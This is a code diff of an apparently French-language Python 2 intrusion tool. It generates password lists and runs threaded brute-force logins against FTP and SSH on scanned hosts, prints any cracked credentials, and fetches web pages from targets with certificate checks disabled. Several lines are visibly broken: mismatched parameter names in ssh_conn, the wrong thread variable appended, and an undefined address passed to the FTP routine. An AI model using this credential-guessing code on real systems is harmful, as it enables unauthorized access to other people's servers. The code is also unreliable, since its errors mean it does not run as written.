@@ -64,11 +64,11 @@ def pwd_alpha(lgr, mode):
 def generate(mode, lgr):
 	stop = False
 	if mode == 'alpha':
-		len_mode = pow(len(ascii_lowercase), 3)
+		len_mode = pow(len(ascii_lowercase), int(lgr))
 	elif mode == 'digits':
-		len_mode = pow(len(digits), 3)
+		len_mode = pow(len(digits), int(lgr))
 	else:
-		len_mode = pow(len(big), 3)
+		len_mode = pow(len(big), int(lgr))
 	try:
 		while stop != True:
 			psswd = pwd_alpha(lgr, mode)
@@ -84,42 +84,48 @@ def generate(mode, lgr):
 		return pwd
 	return pwd
 
-def detonate(log, addr, psswd):
+def detonate(log, addr, psswd, essai):
 	global ftop
 	trig = FTP(addr)
 	try:
+		sys.stdout.write('\r\033[96m[*]\033[0m Essai nb*' + str(essai) + ' : ' + psswd)
+		sys.stdout.flush()
 		ret = trig.login(user=log,passwd=psswd)
 		trig.quit()
 		if "successful" in ret:
 			ftop = 1
-			sys.stdout.write('\n\n\033[94m[+]\033[0m FTP YEAH : ' + addr + ' --> ' + psswd + '\n\n')
+			sys.stdout.write('\n\n\033[91m[+]\033[0m FTP YEAH : ' + addr + ' --> ' + psswd + '\n\n')
 	except:
 		trig.close()
 
-def ssh_conn(log, addr, passwd):
+def ssh_conn(log, addr, passwd, essau):
 	global flag
 	try:
 		client = SSHClient()
 		client.set_missing_host_key_policy(AutoAddPolicy())
+		sys.stdout.write('\r\033[96m[*]\033[0m Essai nb*' + str(essai) + ' : ' + passwd)
+		sys.stdout.flush()
 		client.connect(addr,
 			username=log,
 			password=psswd,
 			timeout=10,
 			look_for_keys=False)
-		print '\n\n\033[94m[+]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n\n'
+		print '\n\n\033[91m[+]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n\n'
 		flag = 1
 	except:
 		pass
 
 def query(port, dst):
-	url 	= '{}:{}'.format(dst, port)
-	cookie	= {'spip_session':pwd_alpha(16, 'alpha')}
+	if port == 443:
+		url = 'https://{}'.format(dst)
+	else:
+		url = 'http://{}:{}'.format(dst, port)
+	cooki	= {'spip_session':pwd_alpha(16, 'alpha')}
 	token	= {'token':pwd_alpha(16, 'alpha')}
 	headers = {'content-type':'application/json'}
-	def upload_pkt(packet):
-    		r = requests.post(url, data=packet, token=token, headers=headers, cookie=cookie)
-		logger.info("Packet envoyé à {}: {}".format(dst, r.status))
- 	return upload_pkt
+	r = requests.get(url, headers=headers, verify=False)
+	logger.info("\033[92m[*]\033[0m {}: \033[91m{}\033[0m".format(dst, r.status_code))
+ 	return r.text.encode('utf-8')
 
 def long2net(arg):
 	if (arg <= 0 or arg >= 0xFFFFFFFF):
@@ -392,44 +398,49 @@ if __name__ == '__main__':
 			dic = generate(args.mode[0], args.longueur[0])
 
 	if online is not None:
-		idx = 0
 		for host in online:
 # FTP ----------------------------------------------------------------------------------------------------------
 			if args.bruteforce:
+				idx = 0
 				if 21 in online[host]:
 					print "\n\033[33m[+]\033[0m Cible avec FTP ouvert : %s." % host
 					try:
 						threads = []
 						for item in dic:
-							t = Thread(target=detonate,args=(user,ip,item,))
+							t = Thread(target=detonate,args=(user,ip,item,idx,))
 							threads.append(t)
 							t.start()
 							idx += 1
+							if len(threads) >= 10:
+								for thr in threads:
+									thr.join()
+								threads = []
 							if ftop == 1:
 								ftop = 0
 								break
-						for thr in threads:
-							thr.join()
 					except KeyboardInterrupt:
 						print '\n[*] Nbr d\'essais '+ str(idx)
 						idx = 0
 					except Exception as e:
 						logger.error("\033[91m[-]\033[0m BF FTP.")
+				idx = 0
 # SSH ----------------------------------------------------------------------------------------------------------
 				if 22 in online[host]:
 					print "\n\033[31m[+]\033[0m Cible avec SSH ouvert : %s." % host
 					try:
 						threads = []
 						for psswd in dic:
-							conn = Thread(target=ssh_conn,args=(user,addr,psswd,))
+							conn = Thread(target=ssh_conn,args=(user,addr,psswd,idx,))
 							threads.append(t)
 							conn.start()
 							idx += 1
+							if len(threads) >= 10:
+								for thr in threads:
+									thr.join()
+								threads = []
 							if flag == 1:
 								flag = 0
 								break
-						for thr in threads:
-							thr.join()
 					except KeyboardInterrupt:
 						print '\n\n[*] Nbr d\'essais '+ str(idx)
 						idx = 0
@@ -438,27 +449,17 @@ if __name__ == '__main__':
 # HTTP ---------------------------------------------------------------------------------------------------------
 			if 80 in online[host] or 8000 in online[host] or 8080 in online[host]:
 				port_idx = [x for i,x in enumerate(online[host]) if x == 8080 or x == 8000 or x == 80]
-				print "\n\033[35m[+]\033[0m Sniffing -> Cible avec HTTP ouvert : {} sur le port {}.".format(host, port_idx[0])
+				print "\n\033[35m[+]\033[0m Getting page -> Cible avec HTTP ouvert : {} sur le port {}.".format(host, port_idx[0])
 				for item in port_idx:
-					sniffed = sniff(prn=query(item, host),
-							filter="tcp and port " + str(item) + " and host " + host,
-							count=25)
-					sniffed.nsummary()
-					try:
-						wrpcap('HTTP-' + host + '-filtered.pcap', sniffed, append=True)
-					except:
-						pass
+					page = query(item, host)
+					with open('HTTP-' + host + '-page.html','w') as f:
+						f.write(page)
 # HTTPS --------------------------------------------------------------------------------------------------------
 			if 443 in online[host]:
 				print "\n\033[1m[+]\033[0m Sniffing -> Cible avec HTTPS ouvert : %s." % host
-				sniffed = sniff(prn=query(443, host),
-						filter="tcp and port 443 and host " + host,
-						count=25)
-				sniffed.nsummary()
-				try:
-					wrpcap('HTTPS-' + host + '-filtered.pcap', sniffed, append=True)
-				except:
-					pass
+				page = query(443, host)
+				with open('HTTPS-' + host + '-page.html','w') as f:
+					f.write(page)
 # SMB ----------------------------------------------------------------------------------------------------------
 			if 445 in online[host]:
 				print "\n\033[36m[+]\033[0m Sniffing -> Cible avec SMB ouvert : %s." % host
